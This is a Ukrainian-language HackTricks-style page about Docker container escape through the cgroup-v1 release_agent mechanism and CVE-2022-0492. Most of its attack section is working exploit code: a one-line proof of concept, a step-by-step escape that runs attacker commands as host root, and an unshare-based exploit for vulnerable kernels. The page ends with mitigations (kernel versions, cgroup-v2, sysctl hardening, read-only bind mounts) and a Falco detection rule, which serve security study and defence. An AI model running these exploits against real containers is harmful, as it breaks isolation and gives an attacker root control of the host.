# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Для отримання додаткової інформації зверніться до** [**оригінального блогу**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Це лише резюме:

---

## Класичний PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
ПPoC зловживає функцією **cgroup-v1** `release_agent`: коли останнє завдання cgroup, яке має `notify_on_release=1`, завершується, ядро (в **початкових просторах імен на хості**) виконує програму, шлях до якої зберігається у записуваному файлі `release_agent`. Оскільки це виконання відбувається з **повними правами root на хості**, отримання прав запису до файлу є достатнім для втечі з контейнера.

### Короткий, зрозумілий посібник

1. **Підготуйте новий cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # або –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Вкажіть `release_agent` на скрипт, контрольований атакуючим, на хості**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Скиньте корисне навантаження**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Запустіть нотифікатор**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # додаємо себе і відразу виходимо
cat /output                                  # тепер містить процеси хоста
```

---

## Уразливість ядра 2022 року – CVE-2022-0492

У лютому 2022 року Yiqi Sun та Kevin Wang виявили, що **ядро *не* перевіряло можливості, коли процес записував у `release_agent` в cgroup-v1** (функція `cgroup_release_agent_write`).

Фактично **будь-який процес, який міг змонтувати ієрархію cgroup (наприклад, через `unshare -UrC`), міг записати довільний шлях до `release_agent` без `CAP_SYS_ADMIN` у *початковому* просторі імен користувача**. У контейнері Docker/Kubernetes з конфігурацією за замовчуванням, що працює під root, це дозволяло:

* підвищення привілеїв до root на хості; ↗
* втечу з контейнера без привілеїв контейнера.

Недолік отримав **CVE-2022-0492** (CVSS 7.8 / Високий) і був виправлений у наступних випусках ядра (та всіх пізніших):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Коміт патчу: `1e85af15da28 "cgroup: Fix permission checking"`.

### Мінімальний експлойт всередині контейнера
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Якщо ядро вразливе, бінарний файл busybox з *хоста* виконується з повними правами root.

### Ускладнення та пом'якшення

* **Оновіть ядро** (≥ версії вище). Патч тепер вимагає `CAP_SYS_ADMIN` у *початковому* просторі імен користувача для запису в `release_agent`.
* **Використовуйте cgroup-v2** – об'єднана ієрархія **повністю видалила функцію `release_agent`**, усунувши цей клас втеч.
* **Вимкніть неправа простори імен користувачів** на хостах, яким вони не потрібні:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Обов'язковий контроль доступу**: політики AppArmor/SELinux, які забороняють `mount`, `openat` на `/sys/fs/cgroup/**/release_agent`, або скидають `CAP_SYS_ADMIN`, зупиняють техніку навіть на вразливих ядрах.
* **Тільки для читання bind-mask** всіх файлів `release_agent` (приклад скрипта Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Виявлення під час виконання

[`Falco`](https://falco.org/) постачає вбудоване правило з версії v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Правило спрацьовує при будь-якій спробі запису в `*/release_agent` з процесу всередині контейнера, який все ще має `CAP_SYS_ADMIN`.

## Посилання

* [Unit 42 – CVE-2022-0492: контейнерний вихід через cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – детальний аналіз та скрипт для пом'якшення.
* [Правило Sysdig Falco та посібник з виявлення](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
